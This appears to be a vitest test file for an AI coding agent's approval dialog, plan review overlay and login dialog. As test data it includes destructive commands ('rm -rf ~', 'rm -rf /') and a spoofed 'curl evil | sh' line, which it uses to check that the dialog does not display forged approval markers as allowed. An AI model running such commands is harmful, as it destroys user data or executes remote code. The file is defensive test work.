			"Allow tool: write\nPath: RULES.md · Content: line 0 …",
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{ fullPrompt: `Allow tool: write\nPath: RULES.md\nContent:\n${content}` },
		);
		// Tern scrolls a `list` capped by `max.lines`; a `col` capped by `max.h` only clips.
		const scroller = () => {
			const list = find(
				dialog.describe(),
				node => node.k === "list" && find(node, child => child.p?.role === "omp.approval.details") !== undefined,
			)!;
			const details = find(list.node, node => node.p?.role === "omp.approval.details")!.node;
			return { max: list.node.k === "list" ? list.node.p?.max : undefined, scroll: details.scroll };
		};
		const cap = { lines: PREVIEW_LIMITS.COLLAPSED_ITEMS };
		expect(scroller().max).toEqual(cap);
		expect(dialog.toggleDetails()).toBe(true);
		expect(scroller().max).toEqual(cap);
		const before = scroller().scroll?.n ?? 0;
		dialog.handleInput("\x1b[6~");
		expect(scroller().scroll).toEqual({ by: "page-down", n: before + 1 });
	});

	it("approval: an expired timeout denies (never approves) and reports the timeout", async () => {
		const denied = Promise.withResolvers<void>();
		const callbacks = { onApprove: vi.fn(), onDeny: vi.fn(() => denied.resolve()) };
		const onTimeout = vi.fn();
		const dialog = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", callbacks, { timeout: 1, onTimeout });
		try {
			await denied.promise;
			expect(onTimeout).toHaveBeenCalledTimes(1);
			expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
			expect(callbacks.onApprove).not.toHaveBeenCalled();
		} finally {
			dialog.dispose();
		}
	});

	it("approval: the expand key or Details swaps the one-row summary for every detail, wrapped, even mid-draft", () => {
		const command = `Command: echo ok && ${"x".repeat(120)} && rm -rf ~\nsecond line`;
		const routed: string[] = [];
		const dialog = new ApprovalDialogComponent(
			"Allow tool: bash\nCommand: echo ok …",
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{
				fullPrompt: `Allow tool: bash\n${command}`,
				draft: { hasDraft: () => true, pasteInFlight: () => false, handleInput: key => routed.push(key) },
			},
		);
		const body = () => stripVTControlCharacters(dialog.render(60).join("\n")).replace(/[│\s]+/g, "");
		expect(body()).not.toContain("rm-rf~");
		// Ctrl+O belongs to the dialog, not the draft that holds the other keys.
		dialog.handleInput("\x0f");
		expect(routed).toEqual([]);
		expect(body()).toContain("rm-rf~");
		expect(body()).toContain("secondline");
		const row = find(dialog.describe(), node => node.p?.role === "omp.approval.details")?.node.c?.[0];
		expect((row as NativeNode).p).not.toHaveProperty("truncate");
		const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
		dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
		expect(body()).not.toContain("rm-rf~");
		// Without a full prompt there is nothing to expand, so no Details button.
		const plain = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", {
			onApprove: vi.fn(),
			onDeny: vi.fn(),
		});
		expect(find(plain.describe(), node => node.key === "expand")).toBeUndefined();
	});

	it("approval: styles covered and prompted compound bash segments distinctly in terminal and native views", () => {
		const prompt = [
			"Allow tool: bash",
			"Command:",
			"  ✓ git status (allowed: git status*)",
			"  ? bun test (requires approval)",
		].join("\n");
		const dialog = new ApprovalDialogComponent(
			prompt,
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{ fullPrompt: prompt },
		);
		const rendered = dialog.render(80);
		const coveredLine = rendered.find(line => stripVTControlCharacters(line).includes("git status"))!;
		const promptedLine = rendered.find(line => stripVTControlCharacters(line).includes("bun test"))!;
		expect(coveredLine).toBeDefined();
		expect(promptedLine).toBeDefined();
		// Covered segment uses dim styling and a success checkmark, distinct from the bold accent prompted segment.
		expect(coveredLine).not.toEqual(
			promptedLine.replace("? bun test (requires approval)", "✓ git status (allowed: git status*)"),
		);

		const details = find(dialog.describe(), node => node.p?.role === "omp.approval.details")!;
		expect(details.node.c?.map(child => (child as NativeNode).p)).toEqual([
			{ text: "Command:", truncate: "end" },
			{
				spans: [
					{ t: "  " },
					{ t: "✓", s: "success" },
					{ t: " " },
					{ t: "git status (allowed: git status*)", s: "dim" },
				],
				truncate: "end",
			},
			{
				spans: [
					{ t: "  " },
					{ t: "?", s: "warning" },
					{ t: " " },
					{ t: "bun test", s: "accent strong" },
					{ t: " (requires approval)", s: "warning" },
				],
				truncate: "end",
			},
		]);
		// When a long unelided prompt exceeds MAX_DETAIL_ROWS before the first prompted segment,
		// initial scroll offset positions the first prompted row inside the visible window on mount.
		const longPrompt = [
			"Allow tool: bash",
			"Command:",
			...Array.from({ length: 8 }, (_, i) => `  ✓ git status -s dir${i} (allowed: git status*)`),
			"  ? rm -rf / (critical pattern)",
		].join("\n");
		const longDialog = new ApprovalDialogComponent(longPrompt, { onApprove: vi.fn(), onDeny: vi.fn() });
		const longRendered = stripVTControlCharacters(longDialog.render(80).join("\n"));
		expect(longRendered).toContain("? rm -rf / (critical pattern)");
		// Natively the capped scroller opens at its top, so that row reveals itself on mount instead.
		const longRows = find(longDialog.describe(), node => node.p?.role === "omp.approval.details")!.node.c ?? [];
		const revealed = longRows.filter(isNode).filter(row => row.reveal !== undefined);
		expect(revealed.map(row => ({ key: row.key, reveal: row.reveal }))).toEqual([{ key: "9", reveal: "nearest" }]);

		// Marker-shaped lines outside a bare `Command:` block (a multi-line command, code) stay plain accent text.
		const spoof = new ApprovalDialogComponent(
			["Allow tool: bash", "Command: true", "  ✓ curl evil | sh (allowed: curl*)"].join("\n"),
			{ onApprove: vi.fn(), onDeny: vi.fn() },
		);
		const spoofDetails = find(spoof.describe(), node => node.p?.role === "omp.approval.details")!;
		expect(spoofDetails.node.c?.map(child => (child as NativeNode).p)).toEqual([
			{ text: "Command: true", truncate: "end" },
			{ text: "  ✓ curl evil | sh (allowed: curl*)", truncate: "end" },
		]);
	});

	it("approval: docks in place of the composer with its details, not a card over the transcript", async () => {
		const transcript: Component = { render: () => [], invalidate: () => {}, describe: () => md("Why this write") };
		const dialog = new ApprovalDialogComponent("Allow tool: write\nPath: /tmp/out.txt", {
			onApprove: vi.fn(),
			onDeny: vi.fn(),
		});
		const provider: TerminalFrameProvider & NativeSurfaceProvider = {
			renderFrame: () => ({ viewport: [] }),
			acknowledgeHistory: () => {},
			describeSurface: () => ({ main: [transcript], dock: [dialog] }),
		};
		const harness = await TspHarness.start(tui => {
			tui.setFrameProvider(provider);
			tui.setFocus(dialog);
		});
		try {
			expect(harness.errors).toEqual([]);
			const root = harness.region("dock")!.c?.find(node => node.p?.role === "omp.editor.ask.approval");
			const scroller = root?.c?.find(node => node.k === "list");
			const details = scroller?.c?.find(node => node.p?.role === "omp.approval.details");
			expect(details?.c?.map(node => node.p)).toEqual([
				expect.objectContaining({ text: "Path: /tmp/out.txt", truncate: "end" }),
			]);
			expect(harness.findAll(node => node.k === "overlay" || node.k === "card")).toEqual([]);
		} finally {
			harness.stop();
		}
	});

	it("plan review: the title heading titles the sheet; the document is the plan without it, editable and commentable", () => {
		const plan = "# Ship credits\n\nintro\n\n## Alpha\n\na\n\n## Beta\n\nb\n";
		const overlay = new PlanReviewOverlay(plan, { options: PLAN_CHOICES }, { onPick: vi.fn(), onCancel: vi.fn() });
		expect(overlay.nativeOverlay.head).toBe("Ship credits");
		const doc = find(overlay.describe(CX), node => node.k === "doc")?.node;
		expect(doc?.p).toEqual({
			role: "omp.plan.doc",
			text: "\nintro\n\n## Alpha\n\na\n\n## Beta\n\nb\n",
			edit: true,
			comment: true,
			comments: [],
		});
	});

	it("plan review: the dock holds the Approve split with its menu, the model chip, Save and Cancel; no option list", () => {
		const onPick = vi.fn();
		const onChange = vi.fn();
		const overlay = new PlanReviewOverlay(
			PLAN,
			{
				options: PLAN_CHOICES,
				refine: { id: "refine", label: "Refine plan" },
				slider: {
					segments: [
						{ label: "default", detail: "Sonnet" },
						{ label: "slow", detail: "Opus" },
					],
					index: 0,
					onChange,
				},
			},
			{ onPick, onCancel: vi.fn(), onSave: vi.fn() },
		);
		const root = overlay.describe(CX);
		expect(find(root, node => node.key === "options")).toBeUndefined();
		expect(find(root, node => node.p?.role === "omp.plan.toc")).toBeDefined();
		const dock = find(root, node => node.key === "dock")!;
		expect(dock.node.p).toEqual({ role: "omp.plan.dock", gap: "sm", align: "center" });
		expect(dock.node.c?.filter(isNode).map(child => child.key ?? child.k)).toEqual([
			"approve",
			"model",
			"spacer",
			"save",
			"cancel",
		]);
		const approve = find(dock.node, node => node.key === "approve")!.node;
		expect(approve.p).toEqual({ variant: "split", role: "omp.plan.approve" });
		expect(approve.c?.filter(isNode).map(child => ({ k: child.k, p: child.p }))).toEqual([
			{ k: "button", p: { text: "Approve", variant: "primary", keys: ["enter"], actions: { click: "approve" } } },
			{
				k: "menu",
				p: {
					trigger: "primary",
					icon: "chev",
					title: "Approve options",
					align: "start",
					items: [
						{ id: "execute", label: "Approve and execute", detail: "Start fresh with just the plan" },
						{ id: "compact", label: "Approve and compact context" },
						{
							id: "keep",
							label: "Approve and keep context",
							detail: "~378k / 1m",
							disabled: "Context is too full",
						},
					],
				},
			},
		]);
		expect(find(dock.node, node => node.key === "model")?.node.p).toMatchObject({
			role: "omp.plan.model",
			text: "Sonnet",
			caret: true,
			items: [
				{ id: "tier:0", label: "default", detail: "Sonnet", radio: "tier", checked: true },
				{ id: "tier:1", label: "slow", detail: "Opus", radio: "tier", checked: false },
			],
		});

		// A model pick is a slider move; a disabled approval does nothing; a menu approval picks it.
		overlay.handleNativeEvent({ type: "action", key: `${dock.path}/model`, act: "tier:1", mods: [] });
		expect(onChange).toHaveBeenCalledWith(1);
		overlay.handleNativeEvent({ type: "action", key: `${dock.path}/approve/more`, act: "keep", mods: [] });
		expect(onPick).not.toHaveBeenCalled();
		overlay.handleNativeEvent({ type: "action", key: `${dock.path}/approve/more`, act: "compact", mods: [] });
		expect(onPick).toHaveBeenCalledWith("compact");
	});

	it("plan review: under the dock Enter approves, ←/→ pick the model and Esc cancels", () => {
		const onPick = vi.fn();
		const onChange = vi.fn();
		const onCancel = vi.fn();
		const overlay = new PlanReviewOverlay(
			"# Plan\n\nbody\n",
			{
				options: PLAN_CHOICES,
				slider: { segments: [{ label: "Fast" }, { label: "Smart" }], index: 0, onChange },
			},
			{ onPick, onCancel },
		);
		overlay.describe(CX);
		setNativeRendering(true);
		try {
			overlay.handleInput(RIGHT);
			overlay.handleInput(LEFT);
			overlay.handleInput(ENTER);
		} finally {
			setNativeRendering(false);
		}
		expect(onChange.mock.calls).toEqual([[1], [0]]);
		expect(onPick).toHaveBeenCalledWith("execute");
		const other = new PlanReviewOverlay("# Plan\n\nbody\n", { options: PLAN_CHOICES }, { onPick, onCancel });
		other.describe(CX);
		other.handleInput("\x1b");
		expect(onCancel).toHaveBeenCalledTimes(1);
	});

	it("plan review: a comment turns Approve into Refine, hides the Contents and round-trips into the feedback", () => {
		const onPick = vi.fn();
		const onFeedbackChange = vi.fn();
		const overlay = new PlanReviewOverlay(
			PLAN,
			{ options: PLAN_CHOICES, refine: { id: "refine", label: "Refine plan" } },
			{ onPick, onCancel: vi.fn(), onFeedbackChange },
		);
		const doc = find(overlay.describe(CX), node => node.k === "doc")!;
		const text = String(doc.node.p && "text" in doc.node.p ? doc.node.p.text : "");
		const at = text.indexOf("second");
		overlay.handleNativeEvent({ type: "comment", key: doc.path, quote: "second", at, note: "too vague" });
		expect(onFeedbackChange).toHaveBeenLastCalledWith(
			'Refinement feedback on the plan:\n\n## Beta\n> "second"\n- too vague\n',
		);
		const root = overlay.describe(CX);
		expect(find(root, node => node.k === "doc")?.node.p).toMatchObject({
			comments: [{ id: "c1", quote: "second", at, note: "too vague" }],
		});
		expect(find(root, node => node.p?.role === "omp.plan.toc")).toBeUndefined();
		expect(find(root, node => node.key === "main")?.node.p).toMatchObject({
			text: "Refine",
			actions: { click: "refine" },
		});

		overlay.handleNativeEvent({ type: "commentNote", key: doc.path, comment: "c1", note: "name the API" });
		expect(String(onFeedbackChange.mock.lastCall?.[0])).toContain("- name the API");
		overlay.handleNativeEvent({ type: "uncomment", key: doc.path, comment: "c1" });
		expect(onFeedbackChange).toHaveBeenLastCalledWith("");
		expect(find(overlay.describe(CX), node => node.key === "main")?.node.p).toMatchObject({ text: "Approve" });

		overlay.handleNativeEvent({ type: "comment", key: doc.path, quote: "second", at, note: "again" });
		overlay.handleNativeEvent({ type: "action", key: "dock/approve/main", act: "refine", mods: [] });
		expect(onPick).toHaveBeenCalledWith("refine");
	});

	it("plan review: an in-place edit updates the plan, reports the full text and keeps the comments", () => {
		const onPlanEdited = vi.fn();
		const onFeedbackChange = vi.fn();
		const overlay = new PlanReviewOverlay(
			PLAN,
			{ options: PLAN_CHOICES },
			{ onPick: vi.fn(), onCancel: vi.fn(), onPlanEdited, onFeedbackChange },
		);
		const doc = find(overlay.describe(CX), node => node.k === "doc")!;
		const text = String(doc.node.p && "text" in doc.node.p ? doc.node.p.text : "");
		overlay.handleNativeEvent({
			type: "comment",
			key: doc.path,
			quote: "third",
			at: text.indexOf("third"),
			note: "split it",
		});
		const edited = text.replace("first", "first, then a much longer opening step");
		overlay.handleNativeEvent({ type: "docChange", key: doc.path, text: edited });
		expect(onPlanEdited).toHaveBeenCalledWith(`# Plan\n${edited}`);
		const after = find(overlay.describe(CX), node => node.k === "doc")?.node.p;
		// The document's own text comes back unchanged (a no-op for Tern); the comment moved with its quote.
		expect(after).toMatchObject({
			text: edited,
			comments: [{ id: "c1", quote: "third", at: edited.indexOf("third"), note: "split it" }],
		});
		expect(String(onFeedbackChange.mock.lastCall?.[0])).toContain('## Gamma\n> "third"\n- split it');
	});

	it("plan review: Save hands the plan over and keeps the review open", () => {
		const onSave = vi.fn();
		const onPick = vi.fn();
		const onCancel = vi.fn();
		const overlay = new PlanReviewOverlay(PLAN, { options: PLAN_CHOICES }, { onPick, onCancel, onSave });
		overlay.describe(CX);
		overlay.handleNativeEvent({ type: "action", key: "dock/save", act: "save", mods: [] });
		expect(onSave).toHaveBeenCalledWith(PLAN);
		expect(onPick).not.toHaveBeenCalled();
		expect(onCancel).not.toHaveBeenCalled();
		// Still live: the dock stays, and a later approval goes through.
		expect(find(overlay.describe(CX), node => node.key === "dock")).toBeDefined();
		overlay.handleNativeEvent({ type: "action", key: "dock/approve/main", act: "approve", mods: [] });
		expect(onPick).toHaveBeenCalledWith("execute");
	});

	it("plan review: older Terns get the option bar; ←/→ walk it, Shift+←/→ step the model slider, ↑ leaves it", () => {
		const onPick = vi.fn();
		const onChange = vi.fn();
		const overlay = new PlanReviewOverlay(
			"# Plan\n\nbody\n",
			{
				options: PLAN_CHOICES.slice(0, 2),
				slider: { segments: [{ label: "Fast" }, { label: "Smart" }], index: 0, onChange },
			},
			{ onPick, onCancel: vi.fn(), onSave: vi.fn() },
		);
		const root = overlay.describe(LEGACY);
		expect(find(root, node => node.key === "dock")).toBeUndefined();
		expect(
			find(root, node => node.key === "options")
				?.node.c?.filter(isNode)
				.map(child => child.p),
		).toEqual([
			expect.objectContaining({ label: "Approve and execute" }),
			expect.objectContaining({ label: "Approve and compact context" }),
			expect.objectContaining({ label: "Save" }),
		]);
		setNativeRendering(true);
		try {
			// → → ← lands on the middle option; Shift+→ then Shift+← round-trips the slider.
			overlay.handleInput(RIGHT);
			overlay.handleInput(RIGHT);
			overlay.handleInput(LEFT);
			overlay.handleInput(SHIFT_RIGHT);
			overlay.handleInput(SHIFT_LEFT);
			// ↓ has nothing below the bar: the selection stays put.
			overlay.handleInput(DOWN);
			// ↑ hands focus to the body, where Enter returns to the bar instead of confirming.
			overlay.handleInput(UP);
			overlay.handleInput(ENTER);
			expect(onPick).not.toHaveBeenCalled();
			overlay.handleInput(ENTER);
		} finally {
			setNativeRendering(false);
		}
		expect(onChange.mock.calls).toEqual([[1], [0]]);
		expect(onPick).toHaveBeenCalledWith("compact");
	});

	it("login: Cancel runs Esc's path and Continue submits the pasted code", async () => {
		const tui = { requestRender() {}, setFocus() {} } as unknown as TUI;
		const onComplete = vi.fn();
		const dialog = new LoginDialogComponent(tui, "openai-codex", onComplete, () => {});
		dialog.showAuth("https://auth.example.com/authorize?x=1", "Enter code: ABCD-1234");
		const waiting = dialog.describe();
		// The device code copies itself; with nothing to answer, opening the page is the primary action.
		expect(find(waiting, node => node.p?.role === "omp.login.code")?.node.p).toMatchObject({
			actions: { click: "copy" },
			href: "ABCD-1234",
		});
		expect(find(waiting, node => node.p?.actions?.click === "open")?.node.p).toMatchObject({
			href: "https://auth.example.com/authorize?x=1",
			tone: "accent",
		});
		expect(find(waiting, node => node.p?.actions?.click === "submit")).toBeUndefined();

		const pending = dialog.showManualInput("Paste the authorization code:");
		const described = dialog.describe();
		// A field waiting for an answer takes the primary action; Open stays as a plain button.
		expect(find(described, node => node.p?.actions?.click === "submit")?.node.p).toMatchObject({ tone: "accent" });
		expect(find(described, node => node.p?.actions?.click === "open")?.node.p?.tone).toBeUndefined();
		dialog.pasteText("code-123");
		dialog.handleNativeEvent({ type: "action", key: "x", act: "submit", mods: [] });
		expect(await pending).toBe("code-123");

		const cancelled = dialog.showManualInput("Paste the authorization code:");
		dialog.handleNativeEvent({ type: "action", key: "x", act: "cancel", mods: [] });
		await expect(cancelled).rejects.toThrow("Login cancelled");
		expect(onComplete).toHaveBeenCalledWith(false, "Login cancelled");
	});
});
